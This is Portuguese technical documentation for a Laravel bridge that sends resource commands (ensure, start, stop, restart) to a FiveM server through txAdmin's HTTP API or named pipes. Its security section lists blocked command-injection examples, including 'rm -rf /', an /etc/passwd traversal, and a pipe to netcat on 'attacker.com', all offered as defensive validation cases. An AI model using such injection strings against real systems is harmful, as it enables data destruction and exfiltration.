# FiveM Command Bridge - Documentação

## Visão Geral

O **FiveM Command Bridge** é um sistema para enviar comandos reais ao FXServer, permitindo:
- `ensure resource` - Garantir que um resource está rodando
- `start resource` - Iniciar um resource parado
- `stop resource` - Parar um resource em execução
- `restart resource` - Reiniciar um resource (stop + ensure)

## Arquitetura

### Camadas

```
FiveMResourceController (API)
    ↓
executeResourceAction()
    ↓
FiveMCommandBridge (Sanitização + Envio)
    ↓
Métodos de Comunicação
    - HTTP API (txAdmin)
    - STDIN (named pipes)
    - RCON (fallback)
```

### Fluxo de Envio

1. **Receber comando** (HTTP POST)
2. **Autenticar** usuário (admin/owner)
3. **Validar resource** existe
4. **Criar CommandBridge** com credenciais do servidor
5. **Sanitizar comando** (bloquear caracteres perigosos)
6. **Enviar via HTTP API** (se token disponível)
7. **Fallback para STDIN** (se folder acessível)
8. **Log de sucesso/falha**

## Segurança

### Sanitização

O bridge implementa validações rigorosas:

1. **Whitelist de ações**: Apenas `ensure`, `start`, `stop`, `restart`
2. **Validação de nome**: Apenas `[a-zA-Z0-9_-]{1,100}`
3. **Regex stricto**: `^(ação)\s+(nome)$`
4. **Rejeita**: Pipes, redirecionadores, variáveis shell, paths

### Exemplos de Bloqueio

```
❌ ensure resource; rm -rf /
❌ ensure ../../../etc/passwd
❌ ensure $(whoami)
❌ ensure `whoami`
❌ ensure & command
❌ ensure | nc attacker.com 1234
```

## Métodos de Comunicação

### Prioridade A: HTTP API (txAdmin)

**Quando usar**: Servidor rodando com txAdmin e token disponível

```php
POST http://127.0.0.1:30120/api/manage/server/log
Authorization: Bearer <token>
Content-Type: application/json

{
    "command": "ensure my-resource"
}
```

**Vantagens**:
- Sem necessidade de acesso direto ao processo
- Funciona remotamente
- Mais seguro

**Desvantagens**:
- Requer txAdmin
- Requer token/password válido

### Prioridade B: STDIN (Named Pipes)

**Quando usar**: Servidor no mesmo host, sem HTTP API

```
\\.\pipe\FXServer_<hash>(folder)
```

**Vantagens**:
- Funciona sem txAdmin
- Comunicação direta

**Desvantagens**:
- Apenas local (Windows)
- Requer acesso ao sistema de arquivos

### Prioridade C: RCON

**Status**: Implementação futura

## Configuração do Servidor

### Pré-requisitos

1. **Servidor FiveM** rodando
2. **server.cfg** configurado
3. **txAdmin token** (opcional, mas recomendado)

### Exemplo server.cfg

```cfg
# Porta
endpoint_add_tcp "0.0.0.0:30120"
endpoint_add_udp "0.0.0.0:30120"

# txAdmin (opcional)
txAdmin-token "sua-chave-secreta"

# Resources automáticos
ensure essential-mode
ensure mysql-async
```

## Uso na API

### Endpoint

```
POST /servers/{serverId}/fivem/resources/{action}
Content-Type: application/json

{
    "resource": "my-resource"
}
```

### Exemplo Request

```bash
curl -X POST http://localhost/api/servers/1/fivem/resources/ensure \
  -H "Authorization: Bearer seu-token-api" \
  -H "Content-Type: application/json" \
  -d '{"resource": "my-resource"}'
```

### Resposta Sucesso

```json
{
    "success": true,
    "message": "Resource 'my-resource' - ação 'ensure' enviada",
    "resource": "my-resource",
    "action": "ensure"
}
```

### Resposta Erro

```json
{
    "success": false,
    "message": "Resource não encontrado"
}
```

## Logging

Todos os comandos são registrados em logs:

```
FiveMCommandBridge: Enviando comando 'ensure my-resource' para 127.0.0.1:30120
FiveMCommandBridge: HTTP API respondeu com sucesso
FiveM resources: Comando 'ensure my-resource' enviado com sucesso (método: http_api)
```

## Troubleshooting

### "Console FiveM ainda não conectado"

**Causa**: 
- Sem HTTP API token
- Sem acesso ao STDIN
- Servidor offline

**Solução**:
1. Verificar se `server->password` tem o token do txAdmin
2. Verificar se servidor está rodando
3. Verificar pasta do servidor está acessível

### Comando não executa

**Verificar**:
1. Nome do resource: `[a-zA-Z0-9_-]` apenas
2. Resource existe na pasta correta
3. Server.cfg tem `ensure resource` ou `start resource`

### HTTP API falha

**Verificar**:
1. Token válido em `server->password`
2. Porta correta (padrão 30120)
3. txAdmin rodando: `http://127.0.0.1:30120/api/manage/server/log`

## Testes

### Teste Unitário

```bash
cd laravel-app
php test_fivem_command_bridge.php
```

### Teste de Integração

```bash
# 1. Iniciar servidor FiveM com txAdmin
# 2. Configurar server no painel com porta e token
# 3. Acessar Resource Manager
# 4. Tentar: ensure, start, stop, restart
```

## Roadmap

- [ ] RCON protocol para fallback
- [ ] WebSocket direto (sem txAdmin)
- [ ] Cache de status de recursos
- [ ] Batch commands (múltiplos resources)
- [ ] Undo/Rollback de ações
- [ ] Resource version tracking

## Veja também

- `app/Services/FiveMCommandBridge.php` - Implementação do bridge
- `app/Engines/FiveMEngine.php` - Motor FiveM
- `app/Http/Controllers/Api/FiveMResourceController.php` - API de recursos
